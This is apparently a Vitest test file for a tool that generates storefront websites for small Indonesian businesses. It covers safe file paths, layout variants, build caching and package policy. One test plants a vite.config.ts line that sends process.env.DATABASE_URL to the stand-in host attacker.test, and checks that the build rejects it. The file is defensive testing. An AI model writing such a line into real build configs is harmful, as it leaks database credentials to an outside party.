import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";

import { afterEach, describe, expect, it, vi } from "vitest";

import { validateGeneratedAppManifest } from "./generated-app-manifest";
import {
  assertSafeProjectFilePath,
  buildGeneratedProject,
  createGeneratedProjectFiles,
  createGeneratedSourceSnapshotMetadata,
  createStarterContractStyles,
  parseGeneratedProjectFiles,
} from "./generated-source";
import { type GeneratedProjectFile } from "./generated-types";
import { createProjectSiteSchemaFromBrief } from "./site-schema";

let tempDir = "";

afterEach(async () => {
  vi.unstubAllEnvs();

  if (tempDir) {
    await rm(tempDir, { force: true, recursive: true });
    tempDir = "";
  }
});

describe("generated project source", () => {
  it("keeps valid stored files only", () => {
    expect(
      parseGeneratedProjectFiles([
        { path: "src/App.tsx", content: "export default function App() {}" },
        { path: 123, content: "bad" },
        null,
      ]),
    ).toEqual([
      { path: "src/App.tsx", content: "export default function App() {}" },
    ]);
  });

  it("starter contract CSS includes theme tokens and shared layout classes", () => {
    const schema = createProjectSiteSchemaFromBrief({
      businessName: "Toko Contoh",
      businessType: "Retail",
      contactOrCta: "WhatsApp",
      notes: [],
      offer: "Produk harian",
      prompt: "buat website toko",
      stylePreference: "Hangat",
      targetCustomer: "Warga lokal",
      version: 1,
    });
    const css = createStarterContractStyles(schema);
    expect(css).toContain("--accent");
    expect(css).toContain(".page{");
    expect(css).toContain(".site-header");
    expect(css).toContain(".hero");
    expect(css).toContain(".fab-wa");
  });

  it("rejects unsafe paths", () => {
    expect(() => assertSafeProjectFilePath("../secret.ts")).toThrow();
    expect(() => assertSafeProjectFilePath("C:/secret.ts")).toThrow();
    expect(() => assertSafeProjectFilePath("node_modules/x.js")).toThrow();
    expect(() => assertSafeProjectFilePath(".env")).toThrow();
    expect(() => assertSafeProjectFilePath(".env.production")).toThrow();
    expect(() => assertSafeProjectFilePath("src/.secret.ts")).toThrow();
    expect(() => assertSafeProjectFilePath("CON")).toThrow();
    expect(() => assertSafeProjectFilePath("bun.lock")).toThrow();
    expect(() =>
      assertSafeProjectFilePath(".agents/skills/impeccable/SKILL.md"),
    ).toThrow();
    expect(() =>
      assertSafeProjectFilePath(".umkmcepat/project.json"),
    ).toThrow();
  });

  it("generates seven beta fixture variants with distinct structure and safe static content", () => {
    const fixtures = [
      {
        key: "angkringan",
        variant: "angkringan",
        marker: ".night-menu",
        input: {
          prompt: "buatkan website angkringan dekat kampus",
          businessType: "Angkringan malam dekat kampus",
          offer: "Nasi kucing, sate usus, gorengan, kopi jos, wedang jahe",
          targetCustomer: "Mahasiswa, anak kos, dan pekerja malam",
          contactOrCta: "Arahkan ke WhatsApp dan Google Maps",
          stylePreference: "Hangat tradisional dengan nuansa lampu malam",
        },
      },
      {
        key: "laundry",
        variant: "laundry",
        marker: ".service-grid",
        input: {
          prompt: "buatkan website laundry kiloan antar jemput",
          businessType: "Laundry kiloan dan satuan",
          offer: "Cuci setrika, laundry ekspres, antar jemput, cuci sepatu",
          targetCustomer: "Karyawan, keluarga muda, dan penghuni kos",
          contactOrCta: "Booking pickup lewat WhatsApp",
          stylePreference: "Bersih modern, rapi, dan ringan",
        },
      },
      {
        key: "coffee",
        variant: "coffee",
        marker: ".brew-board",
        input: {
          prompt: "buatkan website coffee shop kecil untuk kerja remote",
          businessType: "Coffee shop kecil",
          offer: "Espresso based, manual brew, pastry, area kerja nyaman",
          targetCustomer: "Mahasiswa dan pekerja remote",
          contactOrCta: "Lihat menu dan tanya lokasi lewat WhatsApp",
          stylePreference: "Hangat premium sederhana dengan suasana tenang",
        },
      },
      {
        key: "barber",
        variant: "barber",
        marker: ".cut-list",
        input: {
          prompt: "buatkan website barber shop booking whatsapp",
          businessType: "Barber shop pria",
          offer: "Haircut, shave, styling, hair wash",
          targetCustomer: "Pria dewasa dan pekerja sekitar",
          contactOrCta: "Booking jadwal lewat WhatsApp",
          stylePreference: "Tegas, maskulin, bersih, kontras",
        },
      },
      {
        key: "fashion",
        variant: "fashion",
        marker: ".lookbook-grid",
        input: {
          prompt: "buatkan website fashion shop koleksi harian",
          businessType: "Fashion shop lokal",
          offer: "Atasan, outer, celana, koleksi warna netral",
          targetCustomer: "Perempuan muda yang suka outfit simpel",
          contactOrCta: "Tanya stok dan ukuran lewat WhatsApp",
          stylePreference: "Editorial, clean, seperti lookbook",
        },
      },
      {
        key: "tutoring",
        variant: "tutoring",
        marker: ".learning-path",
        input: {
          prompt: "buatkan website jasa les privat sd smp sma",
          businessType: "Jasa les privat",
          offer: "Matematika, bahasa Inggris, persiapan ujian, pendampingan PR",
          targetCustomer: "Orang tua murid SD sampai SMA",
          contactOrCta: "Konsultasi jadwal lewat WhatsApp",
          stylePreference: "Profesional, tenang, dan terpercaya",
        },
      },
      {
        key: "homeFood",
        variant: "home-food",
        marker: ".daily-menu",
        input: {
          prompt: "buatkan website usaha makanan rumahan pre order",
          businessType: "Usaha makanan rumahan",
          offer: "Nasi box, lauk harian, sambal, katering kecil, pre order",
          targetCustomer: "Keluarga sekitar dan pekerja kantor",
          contactOrCta: "Pesan menu hari ini lewat WhatsApp",
          stylePreference: "Hangat rumahan, segar, dan mudah dipesan",
        },
      },
    ] as const;

    const outputs = fixtures.map((fixture) => {
      const files = createFiles(`project_${fixture.key}`, fixture.input);
      const app = readGeneratedFile(files, "src/routes/index.tsx");
      const css = readGeneratedFile(files, "src/styles.css");
      const manifest = validateGeneratedAppManifest(files);

      expect(app).toContain(`variant-${fixture.variant}`);
      expect(css).toContain(`variant-${fixture.variant}`);
      expect(app).toContain("usePreviewReady");
      expect(app).not.toMatch(/checkout|payment|login|register|api\//i);
      expect(css).not.toMatch(/checkout|payment|login|register|api\//i);
      expect(manifest.ok).toBe(true);

      return { app, css };
    });

    expect(new Set(outputs.map((output) => output.css)).size).toBe(7);
    expect(new Set(outputs.map((output) => output.app)).size).toBe(7);
  });

  it("uses an automotive layout for bengkel motor fallback output", () => {
    const files = createFiles("project_bengkel", {
      prompt: "buatkan website bengkel motor",
      businessType: "Bengkel servis motor harian",
      offer:
        "Ganti ban dan velg, perbaikan kelistrikan, aki, lampu, klakson, ECU",
      targetCustomer: "Pengendara harian dan pekerja sekitar",
      contactOrCta: "Booking servis lewat WhatsApp",
      stylePreference: "Modern bersih dan teknis",
    });

    expect(readGeneratedFile(files, "src/routes/index.tsx")).toContain(
      "variant-automotive",
    );
    expect(readGeneratedFile(files, "src/styles.css")).toContain(
      "variant-automotive",
    );
  });
  it("adds a preview-ready signal after the generated React app renders", () => {
    const app = readGeneratedFile(
      createFiles("project_ready_signal", {
        prompt: "buatkan website jasa potong rambut",
        businessType: "Jasa pangkas rambut",
        offer: "Potong rambut, cukur rapi, dan styling cepat",
        targetCustomer: "Pria dewasa sekitar",
        contactOrCta: "Booking lewat WhatsApp",
        stylePreference: "Bersih dan profesional",
      }),
      "src/lib/preview-ready.ts",
    );

    expect(app).toContain("useEffect");
    expect(app).toContain("generated-app-preview-ready");
  });

  it("uses hash history so preview proxy paths do not become app routes", () => {
    const files = createFiles("project_hash_history", {
      prompt: "buatkan website bengkel motor",
      businessType: "Bengkel motor",
      offer: "Servis motor harian",
      targetCustomer: "Pengendara harian",
      contactOrCta: "Booking WhatsApp",
      stylePreference: "Teknis",
    });

    expect(readGeneratedFile(files, "src/router.tsx")).toContain(
      "createHashHistory",
    );
    expect(readGeneratedFile(files, "src/router.tsx")).toContain(
      "createRouter({ history, routeTree })",
    );
  });

  it("generates standalone design context without platform metadata", () => {
    const files = createFiles("project_manifest", {
      prompt: "buatkan website coffee shop",
      businessType: "Coffee shop kecil",
      offer: "Menu kopi, suasana tempat, dan lokasi",
      targetCustomer: "Mahasiswa dan pekerja remote",
      contactOrCta: "Hubungi lewat WhatsApp",
      stylePreference: "Hangat dan premium sederhana",
    });

    const result = validateGeneratedAppManifest(files);

    expect(result.ok).toBe(true);
    expect(files.some((file) => file.path.startsWith(".umkmcepat/"))).toBe(
      false,
    );
    // Agent-facing files (PRODUCT.md, DESIGN.md, .agents/) are now internal
    // and not included in generated project files.
  });

  it("creates snapshot metadata with manifest, origin, and summary", () => {
    const schema = createProjectSiteSchemaFromBrief({
      businessName: "",
      businessType: "Laundry kiloan",
      contactOrCta: "WhatsApp",
      notes: [],
      offer: "Cuci setrika dan antar jemput",
      prompt: "buat website laundry",
      stylePreference: "Bersih",
      targetCustomer: "Keluarga sekitar",
      version: 1,
    });
    const files = createGeneratedProjectFiles("project_snapshot", schema);

    expect(createGeneratedSourceSnapshotMetadata(files, schema)).toMatchObject({
      manifest: {
        runtimeProfile: "vite-react-tanstack-v1",
        schemaVersion: "1",
      },
      origin: {
        generator: "site-schema",
        sourceType: "generated",
      },
      sourceFileCount: files.length,
      summary: {
        businessName: schema.businessName,
        runtimeProfile: "vite-react-tanstack-v1",
      },
    });
  });

  it("does not invoke the command runner when generated builds are disabled", async () => {
    vi.stubEnv("GENERATED_BUILD_EXECUTION_ENABLED", "false");
    const commandRunner = vi.fn(async () => ({ log: "unexpected", ok: true }));

    const result = await buildGeneratedProject(buildableFiles("disabled"), {
      commandRunner,
    });

    expect(result).toEqual({
      distFiles: [],
      log: "Generated build execution is disabled by platform policy.",
      ok: false,
    });
    expect(commandRunner).not.toHaveBeenCalled();
  });

  it("accepts standalone source without a platform manifest", async () => {
    const result = await buildGeneratedProject(buildableFiles("standalone"), {
      commandRunner: async (command, cwd) => {
        if (normalizeCommand(command) === "<bun> install --ignore-scripts") {
          await mkdir(path.join(cwd, "node_modules"), { recursive: true });
        }

        if (normalizeCommand(command) === "<bun> run build") {
          await writeDist(cwd, "<html>ok</html>");
        }

        return { log: command.join(" "), ok: true };
      },
    });

    expect(result.ok).toBe(true);
    expect(result.distFiles).toEqual([
      {
        content: "<html>ok</html>",
        contentType: "text/html; charset=utf-8",
        path: "index.html",
      },
    ]);
  });

  it("skips dependency install for repeat workspace builds with unchanged packages", async () => {
    tempDir = await mkdtemp(path.join(os.tmpdir(), "umkmcepat-build-cache-"));
    const files = buildableFiles("project_cached");
    const commands: string[] = [];
    const commandRunner = async (command: string[], cwd: string) => {
      const normalized = normalizeCommand(command);
      commands.push(normalized);

      if (normalized === "<bun> install --ignore-scripts") {
        await mkdir(path.join(cwd, "node_modules"), { recursive: true });
      }

      if (normalized === "<bun> run build") {
        await writeDist(cwd, "cached");
      }

      return { ok: true, log: command.join(" ") };
    };

    await buildGeneratedProject(files, {
      commandRunner,
      workspaceRoot: tempDir,
    });
    const second = await buildGeneratedProject(
      files.map((file) =>
        file.path === "src/App.tsx"
          ? { ...file, content: "export default 'changed';" }
          : file,
      ),
      { commandRunner, workspaceRoot: tempDir },
    );

    expect(commands).toEqual([
      "<bun> install --ignore-scripts",
      "<bun> run build",
      "<bun> run build",
    ]);
    expect(second.log).toContain('"installSkipped":true');
  });

  it("reinstalls when the generated package changes", async () => {
    tempDir = await mkdtemp(path.join(os.tmpdir(), "umkmcepat-build-cache-"));
    const commands: string[] = [];
    const commandRunner = async (command: string[], cwd: string) => {
      commands.push(normalizeCommand(command));

      if (normalizeCommand(command) === "<bun> install --ignore-scripts") {
        await mkdir(path.join(cwd, "node_modules"), { recursive: true });
      }

      if (normalizeCommand(command) === "<bun> run build") {
        await writeDist(cwd, "package-change");
      }

      return { ok: true, log: command.join(" ") };
    };
    const files = buildableFiles("project_package_change");

    await buildGeneratedProject(files, {
      commandRunner,
      workspaceRoot: tempDir,
    });
    await buildGeneratedProject(
      files.map((file) =>
        file.path === "package.json"
          ? {
              ...file,
              content: JSON.stringify({
                ...JSON.parse(file.content),
                devDependencies: {
                  ...JSON.parse(file.content).devDependencies,
                  globals: "^16.5.0",
                },
              }),
            }
          : file,
      ),
      { commandRunner, workspaceRoot: tempDir },
    );

    expect(commands).toEqual([
      "<bun> install --ignore-scripts",
      "<bun> run build",
      "<bun> install --ignore-scripts",
      "<bun> run build",
    ]);
  });

  it("removes stale files from persistent build workspaces", async () => {
    tempDir = await mkdtemp(path.join(os.tmpdir(), "umkmcepat-build-cache-"));
    const files = buildableFiles("project_stale_files", [
      { content: "export const stale = true;", path: "src/stale.ts" },
    ]);
    const commandRunner = async (command: string[], cwd: string) => {
      if (normalizeCommand(command) === "<bun> install --ignore-scripts") {
        await mkdir(path.join(cwd, "node_modules"), { recursive: true });
      }

      if (normalizeCommand(command) === "<bun> run build") {
        await writeDist(cwd, "stale");
      }

      return { ok: true, log: command.join(" ") };
    };

    await buildGeneratedProject(files, {
      commandRunner,
      workspaceRoot: tempDir,
    });
    await buildGeneratedProject(
      files.filter((file) => file.path !== "src/stale.ts"),
      { commandRunner, workspaceRoot: tempDir },
    );

    await expect(
      readFile(
        path.join(
          tempDir,
          "project_stale_files",
          "vite-react-tanstack-v1",
          "src",
          "stale.ts",
        ),
        "utf8",
      ),
    ).rejects.toThrow();
  });

  it("resets a warm workspace and retries once after a build failure", async () => {
    tempDir = await mkdtemp(path.join(os.tmpdir(), "umkmcepat-build-cache-"));
    const commands: string[] = [];
    const files = buildableFiles("project_retry");
    let buildAttempts = 0;
    const commandRunner = async (command: string[], cwd: string) => {
      const normalized = normalizeCommand(command);
      commands.push(normalized);

      if (normalized === "<bun> install --ignore-scripts") {
        await mkdir(path.join(cwd, "node_modules"), { recursive: true });
      }

      if (normalized === "<bun> run build") {
        buildAttempts += 1;

        if (buildAttempts === 2) {
          return { ok: false, log: "corrupt cache" };
        }

        await writeDist(cwd, "retry");
      }

      return { ok: true, log: command.join(" ") };
    };

    await buildGeneratedProject(files, {
      commandRunner,
      workspaceRoot: tempDir,
    });
    const result = await buildGeneratedProject(files, {
      commandRunner,
      workspaceRoot: tempDir,
    });

    expect(result.ok).toBe(true);
    expect(commands).toEqual([
      "<bun> install --ignore-scripts",
      "<bun> run build",
      "<bun> run build",
      "<bun> install --ignore-scripts",
      "<bun> run build",
    ]);
    expect(result.log).toContain('"cacheReset":true');
  }, 15_000);

  it("fails build preflight when package policy rejects a dependency", async () => {
    const files = createFiles("project_blocked_package", {
      prompt: "buat website barber shop",
      businessType: "Barber shop",
      offer: "Potong rambut dan booking WhatsApp",
      targetCustomer: "Pelanggan sekitar",
      contactOrCta: "Booking lewat WhatsApp",
      stylePreference: "Rapi dan tegas",
    }).map((file) =>
      file.path === "package.json"
        ? {
            ...file,
            content: JSON.stringify({
              dependencies: { express: "file:./missing" },
              scripts: { build: "vite build" },
            }),
          }
        : file,
    );

    const result = await buildGeneratedProject(files);

    expect(result.ok).toBe(false);
    expect(result.distFiles).toEqual([]);
    expect(result.log).toContain("Generated app build policy failed preflight");
    expect(result.log).toContain(
      "Package is not allowed for vite-react-tanstack-v1: express",
    );
  });

  it("rejects generated executable configuration before running a command", async () => {
    const commandRunner = vi.fn(async () => ({ log: "unexpected", ok: true }));
    const files = createFiles("project_malicious_config", {
      prompt: "buat website barber shop",
      businessType: "Barber shop",
      offer: "Potong rambut dan booking WhatsApp",
      targetCustomer: "Pelanggan sekitar",
      contactOrCta: "Booking lewat WhatsApp",
      stylePreference: "Rapi dan tegas",
    }).map((file) =>
      file.path === "vite.config.ts"
        ? {
            ...file,
            content:
              'fetch("https://attacker.test/" + process.env.DATABASE_URL); export default {}',
          }
        : file,
    );

    const result = await buildGeneratedProject(files, { commandRunner });

    expect(result.ok).toBe(false);
    expect(result.log).toContain(
      "Vite configuration must match the platform-owned configuration.",
    );
    expect(commandRunner).not.toHaveBeenCalled();
  });
});

async function writeDist(cwd: string, content: string) {
  await mkdir(path.join(cwd, "dist"), { recursive: true });
  await writeFile(path.join(cwd, "dist", "index.html"), content);
}

// Replace the resolved runner path (which is environment-dependent) with a
// stable token so assertions stay focused on the command structure.
function normalizeCommand(command: string[]) {
  return command.map((part, index) => (index === 0 ? "<bun>" : part)).join(" ");
}

function buildableFiles(
  projectId: string,
  extraFiles: GeneratedProjectFile[] = [],
): GeneratedProjectFile[] {
  return [
    {
      path: "generated-app.manifest.json",
      content: JSON.stringify({
        buildCommand: "bun run build",
        capabilities: ["static_content"],
        outputDirectory: "dist",
        packageManager: "bun",
        projectId,
        routes: [{ path: "/", title: "Beranda" }],
        runtimeProfile: "vite-react-tanstack-v1",
        schemaVersion: "1",
        templateId: "vite-react-tanstack-starter",
        templateVersion: "1.0.0",
      }),
    },
    {
      path: "package.json",
      content: JSON.stringify({
        private: true,
        scripts: { build: "vite build" },
        dependencies: {
          "@tanstack/react-query": "^5.101.2",
          "@tanstack/react-router": "^1.170.17",
          clsx: "^2.1.1",
          "lucide-react": "^0.575.0",
          react: "^19.2.7",
          "react-dom": "^19.2.7",
        },
        devDependencies: {
          "@vitejs/plugin-react": "^6.0.3",
          typescript: "^5.9.3",
          vite: "^7.2.7",
        },
      }),
    },
    { path: "src/App.tsx", content: "export default 'ok';" },
    ...extraFiles,
  ];
}

function createFiles(
  projectId: string,
  input: {
    businessType: string;
    contactOrCta: string;
    offer: string;
    prompt: string;
    stylePreference: string;
    targetCustomer: string;
  },
) {
  return createGeneratedProjectFiles(
    projectId,
    createProjectSiteSchemaFromBrief({
      version: 1,
      businessName: "",
      notes: [],
      ...input,
    }),
  );
}

function readGeneratedFile(
  files: ReturnType<typeof createGeneratedProjectFiles>,
  path: string,
) {
  const file = files.find((item) => item.path === path);

  if (!file) {
    throw new Error(`Missing generated file: ${path}`);
  }

  return file.content;
}
